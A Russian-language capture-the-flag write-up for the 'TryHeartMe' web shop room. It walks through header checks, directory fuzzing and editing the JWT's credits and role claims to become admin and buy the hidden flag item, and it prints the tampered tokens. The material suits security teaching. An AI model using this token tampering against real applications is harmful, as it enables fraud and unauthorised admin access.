# Writeup: TryHeartMe

> The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?

Начнем с исследования заголовков веб-приложения:
```sh
curl 10.113.129.218:5000 -I
```
```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.12.3
Date: Sat, 21 Nov 2026 18:12:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3351
Connection: close
```
Из заголовков ответа сервера становится ясно, что приложение на python3.  

Далее я проверю возможные директории/файлы через [CyberWarn](https://github.com/rickert155/CyberWarn):
```sh
python3 -m cyberwarn fuzz-dirs --url=http://10.113.129.218:5000 --wordlist=data/wordlist/web/top-10k-web-directories_from_10M_urlteam_links.txt --workers=100
```
В результате чего получаю список URL и статус кодов:
```sh
http://10.113.129.218:5000/login 200
http://10.113.129.218:5000/account 200
http://10.113.129.218:5000/admin 200
http://10.113.129.218:5000/register 200
```
Не будем пытаться получить чужую учетку в приложении, так как можно создать свою. Создаю учетные данные с доступами:  
- login: tester@test.com
- password: Test123!  

В браезере сразу проверить наш JWT токен, мой в данном случае такой:
```sh
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RlckB0ZXN0LmNvbSIsInJvbGUiOiJ1c2VyIiwiY3JlZGl0cyI6MCwiaWF0IjoxNzk1Mjg1MDY5LCJ0aGVtZSI6InZhbGVudGluZSJ9.w2CWdv8R8tmHvZBTAw-A8-tWv43Vmju1aPk12TXDxo0
```
Через сервис [jwt.io](https://www.jwt.io) декодириуем в удобный для нас формат:
```json
{
    "alg": "HS256",
    "typ": "JWT"
}
{
    "email": "tester@test.com",
    "role": "user",
    "credits": 0,
    "iat": 1795285069,
    "theme": "valentine"
}
```
В профиле можем заметить, что *credits* у нас 0, попробуем изменит значение credits на 100 в токене и отдать браузеру их.
```sh
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RlckB0ZXN0LmNvbSIsInJvbGUiOiJ1c2VyIiwiY3JlZGl0cyI6MTAwLCJpYXQiOjE3OTUyODUwNjksInRoZW1lIjoidmFsZW50aW5lIn0.Y--TtPcGzSMMEsVKaT4fx_gYTQL8Ngn_8vQTQnYfFuM
```
Отлично, после перезагрузки страницы можно заметить, что *credits* теперь у нас значение *100*. В таком случае можем попробовать поменить *role* с **user** на **admin**:
```sh
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RlckB0ZXN0LmNvbSIsInJvbGUiOiJhZG1pbiIsImNyZWRpdHMiOjEwMCwiaWF0IjoxNzk1Mjg1MDY5LCJ0aGVtZSI6InZhbGVudGluZSJ9.c3OGo5h1xal8SmwKUmaePfBPFZLvAW7zusRYlFIgP38
```
После смены роли на *admin* заметим, что баланс наш теперь 5000, а не 100, как было до этого. Пойдем что-то купим на них! В шопе можем заметить valenflag? Его мы покупаем и получаем флаг!
